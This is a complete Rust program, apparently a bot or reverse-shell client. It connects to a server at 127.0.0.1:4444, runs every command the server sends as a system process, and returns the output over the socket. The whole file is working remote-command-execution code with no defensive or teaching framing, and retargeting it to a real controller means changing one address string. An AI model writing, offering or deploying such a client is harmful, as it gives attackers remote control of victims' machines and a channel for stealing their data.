use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::time::Duration;

fn main() {
    let server_address = "127.0.0.1:4444";

    println!("[*] Command Bot starting...");
    println!("[*] Attempting to connect to server at {}", server_address);

    // Attempt to connect to the server
    match TcpStream::connect(server_address) {
        Ok(mut stream) => {
            println!("[+] Successfully connected to server at {}", server_address);

            // Set read timeout to avoid blocking indefinitely
            let _ = stream.set_read_timeout(Some(Duration::from_secs(30)));

            // Main command loop
            loop {
                let mut buffer = [0; 4096];

                match stream.read(&mut buffer) {
                    Ok(0) => {
                        println!("[!] Server closed the connection");
                        break;
                    }
                    Ok(n) => {
                        // Received data from server
                        let command_str = String::from_utf8_lossy(&buffer[..n]);
                        let command = command_str.trim();

                        if command.is_empty() {
                            continue;
                        }

                        println!("[*] Received command: {}", command);

                        // Execute the command
                        let result = execute_command(command);

                        // Send result back to server
                        match stream.write_all(result.as_bytes()) {
                            Ok(_) => {
                                println!("[+] Result sent back to server");
                            }
                            Err(e) => {
                                println!("[!] Error sending result to server: {}", e);
                                break;
                            }
                        }
                    }
                    Err(e) => {
                        println!("[!] Error reading from server: {}", e);
                        break;
                    }
                }
            }
        }
        Err(e) => {
            println!("[!] Failed to connect to server: {}", e);
            println!("[*] Make sure the server is running on {}:4444", "127.0.0.1");
        }
    }

    println!("[*] Bot disconnected");
}

/// Execute a system command and return the output
fn execute_command(command: &str) -> String {
    // Parse the command string
    let parts: Vec<&str> = command.split_whitespace().collect();

    if parts.is_empty() {
        return "Error: Empty command".to_string();
    }

    let cmd = parts[0];
    let args = &parts[1..];

    // Execute the command
    match Command::new(cmd)
        .args(args)
        .output()
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            if output.status.success() {
                if stdout.is_empty() {
                    "[+] Command executed successfully (no output)\n".to_string()
                } else {
                    format!("[+] Command output:\n{}\n", stdout)
                }
            } else {
                if stderr.is_empty() {
                    format!("[-] Command failed with status: {}\n", output.status)
                } else {
                    format!("[-] Command error:\n{}\n", stderr)
                }
            }
        }
        Err(e) => {
            format!("[-] Failed to execute command: {}\n", e)
        }
    }
}

